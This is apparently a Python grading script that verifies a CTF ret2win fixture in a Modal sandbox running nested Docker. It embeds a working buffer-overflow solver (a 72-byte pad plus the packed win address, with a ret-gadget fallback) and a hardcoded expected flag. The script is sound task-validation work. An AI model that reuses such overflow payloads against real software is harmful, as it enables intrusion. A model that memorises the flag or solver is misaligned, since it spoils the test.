"""Trusted reference-flag verification for fixture-ctf-ret2win on Modal nested Docker.

Fix vs previous attempts (dynamic1-4 / bruteforce):
1. Transport: solver reads with a recv loop until EOF/timeout instead of a single
   recv(4096). Prior runs only captured the "hello ..." segment and never read
   the flag segment, so win() may have worked without being observed.
2. Fallback: if direct ret2win does not yield the flag, retry with a ret gadget
   before win() (stack-alignment, classic movaps crash in older glibc).
3. Win/ret addresses are extracted from the Dockerfile build stage (binutils
   present there) instead of blind offsets.
"""
import json
import modal

FIXTURE = '/home/michael/work/s19-verl64b-run/evidence/rlf/vm-fixture'
EXPECTED_FLAG = 'flag{trusted_vm_acceptance_7b3d}'

app = modal.App.lookup('yeto-rlf-ctf-grade-recvfix', create_if_missing=True)
image = modal.Image.from_registry('docker:27-dind').add_local_dir(FIXTURE, remote_path='/opt/task')

SOLVER_PY = r'''
import os, socket, struct, sys

host, port = '127.0.0.1', 31337
win = int(os.environ['WIN_ADDR'], 16)
_ret_s = os.environ.get('RET_ADDR', '').strip()
ret = int(_ret_s, 16) if _ret_s else None
expected = os.environ['EXPECTED_FLAG']

def attempt(payload, label):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(5)
    buf = b''
    # read prompt
    while b'name:' not in buf:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
    s.sendall(payload + b'\n')
    out = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    s.close()
    text = out.decode(errors='replace')
    print(f'ATTEMPT {label}: {text!r}')
    return expected in text

pad = b'A' * 72
if attempt(pad + struct.pack('<Q', win), 'direct-win'):
    print('GRADE_OUTPUT:' + expected)
    sys.exit(0)
if ret is not None and attempt(pad + struct.pack('<Q', ret) + struct.pack('<Q', win), 'ret-plus-win'):
    print('GRADE_OUTPUT:' + expected)
    sys.exit(0)
print('GRADE_OUTPUT:MISSING')
sys.exit(1)
'''

script = r'''set +e
rm -rf /var/lib/docker /run/docker; mkdir -p /run/docker
(dockerd --host=unix:///run/docker/docker.sock --iptables=false --bridge=none >/tmp/dockerd.log 2>&1 &)
for i in $(seq 1 40); do docker -H unix:///run/docker/docker.sock info >/dev/null 2>&1 && break; sleep 1; done
D='docker -H unix:///run/docker/docker.sock'
$D build --network host --target build -t rlf-ctf-build /opt/task >/tmp/build-stage.log 2>&1
echo BUILD_STAGE_RC:$?
WIN_ADDR=$($D run --rm --entrypoint sh rlf-ctf-build -c "nm -n /tmp/build/challenge | grep ' win\$' | awk '{print \$1}'")
RET_ADDR=$($D run --rm --entrypoint sh rlf-ctf-build -c "objdump -d /tmp/build/challenge | grep -m1 -E '^ *[0-9a-f]+:[[:space:]]+c3[[:space:]]+ret' | cut -d: -f1 | tr -d ' '")
echo WIN_ADDR:$WIN_ADDR
echo RET_ADDR:$RET_ADDR
$D build --network host -t rlf-ctf /opt/task >/tmp/build.log 2>&1
echo BUILD_RC:$?
cid=$($D run -d --network host -e FLAG='__EXPECTED_FLAG__' rlf-ctf)
echo TARGET_CID:$cid
sleep 2
cat > /tmp/solver.py <<'SOLVER_EOF'
__SOLVER_PY__
SOLVER_EOF
scid=$($D create --network host -e WIN_ADDR=$WIN_ADDR -e RET_ADDR=$RET_ADDR -e EXPECTED_FLAG='__EXPECTED_FLAG__' python:3.12-slim python /tmp/solver.py)
$D cp /tmp/solver.py $scid:/tmp/solver.py
$D start -a $scid
echo SOLVER_RC:$?
$D rm -f $cid $scid >/dev/null 2>&1
echo CLEAN_RC:$?
'''
script = script.replace('__EXPECTED_FLAG__', EXPECTED_FLAG).replace('__SOLVER_PY__', SOLVER_PY)

sb = modal.Sandbox.create('sh', '-lc', script, app=app, image=image, runtime='vm',
                          cpu=2, memory=4096, timeout=900, idle_timeout=120,
                          tags={'yeto-purpose': 'rlf-trusted-grade', 'yeto-task': 'fixture-ctf-ret2win'})
try:
    print(json.dumps({'sandbox_id': sb.object_id,
                      'stdout': ''.join(list(sb.stdout)),
                      'stderr': ''.join(list(sb.stderr))}))
finally:
    sb.terminate()
    print('SANDBOX_TERMINATED')
